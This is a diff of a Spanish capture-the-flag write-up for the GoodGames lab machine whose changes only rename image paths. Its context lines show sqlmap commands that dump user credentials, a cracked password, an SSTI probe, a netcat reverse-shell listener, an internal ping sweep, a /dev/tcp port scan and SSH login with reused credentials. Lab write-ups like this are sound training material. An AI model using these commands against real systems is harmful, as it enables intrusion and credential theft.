@@ -58,7 +58,7 @@ Conocer las bases de datos.
 sqlmap -u http://10.10.11.130 --forms --dbs --batch
 ```
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 Conocer las tablas de la base de datos objetivo.
 
@@ -66,7 +66,7 @@ Conocer las tablas de la base de datos objetivo.
 sqlmap -u http://10.10.11.130 --forms -D main --tables --batch
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Conocer las columnas de la tabla de la bases de datos objetivo.
 
@@ -74,7 +74,7 @@ Conocer las columnas de la tabla de la bases de datos objetivo.
 sqlmap -u http://10.10.11.130 --forms -D main -T user --columns --batch
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Conocer la información que hay en esas columnas.
 
@@ -82,13 +82,13 @@ Conocer la información que hay en esas columnas.
 sqlmap -u http://10.10.11.130 --forms -D main -T user -C name,id,email,password --dump --batch
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Hemos encontrado unas credenciales aunque la contraseña al ser un hash la crackeamos.
 
-<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Después de analizar el sitio web del perfil, encontramos un símbolo de configuración que nos redirige a una URL con un dominio diferente. Como primer paso, registraremos este nuevo dominio en el archivo `/etc/hosts`.
 
@@ -96,11 +96,11 @@ Después de analizar el sitio web del perfil, encontramos un símbolo de configu
 echo "10.10.11.130 internal-administration.goodgames.htb" >> /etc/hosts
 ```
 
-<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nos logueamos con esas credenciales.
 
-<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 🚀 **EXPLOTACIÓN**
 
@@ -110,7 +110,7 @@ Con **Wappalyzer** se ejecuta **Python** por lo que parece una vulnerabilidad **
 {{ 7 * 7 }}
 ```
 
-<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Es vulnerable a **SSTI** por lo que realizamos un payload que contiene una Reverse Shell.
 
@@ -124,7 +124,7 @@ Nos ponemos en escucha.
 nc -nlvp 4444
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 🔐 PRIVILEGIOS
 
@@ -136,7 +136,7 @@ whoami
 
 somos **root.** No somos root de manera oficial.
 
-<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 La interfaz de red está conectada al adaptador de red interna con la dirección `172.19.0.2/16`, lo que nos permite comunicarnos con la red interna desde nuestra máquina de ataque a través de la red comprometida.
 
@@ -146,7 +146,7 @@ Para descubrir los hosts en la red interna, utilizamos el siguiente comando en u
 for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" &); done;
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Una vez identificado un objetivo, realizamos un escaneo de puertos con el siguiente comando:
 
@@ -154,11 +154,11 @@ Una vez identificado un objetivo, realizamos un escaneo de puertos con el siguie
 for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
 ```
 
-<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Comencé a buscar credenciales de SSH en la máquina y finalmente encontré la carpeta de un usuario dentro del directorio `/home`. Sin embargo, no encontré a `augustus` en el archivo `/etc/passwd`.
 
-<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que el puerto 22 y 80 están abiertos, por lo que intentamos conectarnos por SSH con el usuario augustus utilizando la contraseña que habíamos encontrado previamente (superadministrator).
 
